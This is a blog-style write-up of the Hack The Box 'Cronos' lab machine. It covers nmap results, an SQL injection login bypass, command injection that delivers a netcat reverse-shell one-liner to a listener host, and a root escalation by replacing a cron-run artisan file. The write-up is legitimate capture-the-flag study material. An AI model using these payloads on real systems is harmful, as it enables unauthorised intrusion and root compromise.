---
layout: post
title:  "HTB Cronos Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---

# Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
# pwning user
The presence of port 53 being open hinted to me that virtual host routing may be involved. Edit /etc/hosts file to add `cronos.htb` for a site to resolve.
Resolving the host also returns 'admin.cronos.htb' so add that too.

The admin subdomain automatically stood out so i went to the page and found a login form. Basic sql injection ('OR 1=1# and any password) bypasses the login and allows us entry into the page. 
"Net Tool v0.1" allows us to input code to execute but we can inject our own by adding a semicolon after the expected address. Inject a basic bash reverse shell and run a listener to recieve a shell.
```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f 
```
We can now grab user.txt

# Gaining root
As the box name suggests this proceedure may involve a cronjob. Doing a check for jobs returns the following;
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

From this it appears that root is executing the file 'artisan' on a regular cron. If we replace the file in this location with one under the same name it should execute as root. Placing a shell here executes when the cron triggers and gives us a shell as root.
```
listening on [any] 9150 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.13] 44730
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 10:57:01 up 3 days,  1:20,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
```
Can now grab the root flag and cleanup.

